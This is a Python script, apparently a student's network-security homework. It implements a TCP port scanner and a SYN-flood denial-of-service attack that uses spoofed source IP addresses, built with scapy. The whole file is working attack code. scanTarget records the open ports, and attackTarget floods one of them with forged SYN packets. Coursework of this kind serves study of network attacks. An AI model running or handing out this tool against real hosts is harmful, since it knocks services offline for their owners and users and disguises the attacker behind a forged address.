#!/usr/bin/env python 3.8
#Homework: 8
#Name: Michael Kolb
#ECN login:kolb3
#Due Date: 03/30/2021

import sys, socket
import re
from scapy.all import *

verbosity = 0 #set equal to 0 to eliminate print statements for testing

class TcpAttack:
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        #class information for remembering to set something in a class you need
        #class.object = input/algorithm
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    #pulled and altered from lecture section 16.15
    #rangeStart: Integer designating the first port in the range of ports being scanned.
    #rangeEnd: Integer designating the last port in the range of ports being scanned
    #No return value, but writes open ports to openports.txt
    def scanTarget(self,rangeStart,rangeEnd):
        fileout = open('openports.txt', 'w')
        for n in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            
            try:
                sock.connect((self.targetIP, n))
                if verbosity: print("Port open: ", n) 
                fileout.write(str(n))
                fileout.write("\n")
            except:
                if verbosity: print("Port closed: ", n)
        fileout.close()
            
    #port: Integer designating the port that the attack will use
    #numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self,port,numSyn):
        hit = 0
        openports = []
        filein = open('openports.txt', 'r')
        inports = filein.readlines()
        for i in inports:
            openports.append(int(i))# = int(i)
        print(openports)
        if port in openports:
            for n in range(0,numSyn):
                packet = IP(src=self.spoofIP, dst=self.targetIP) / TCP(sport = RandShort(), dport=port, flags="S")
                try:
                    send(packet, verbose=0) #change verbose to 1 if want to see sent packet for each sent packet
                    hit = 1
                except Exception as e:
                    if verbosity: print("This is the exception: ",e)
        else:
            if verbosity: print("Port is not in openports.txt!")
        filein.close()
        return hit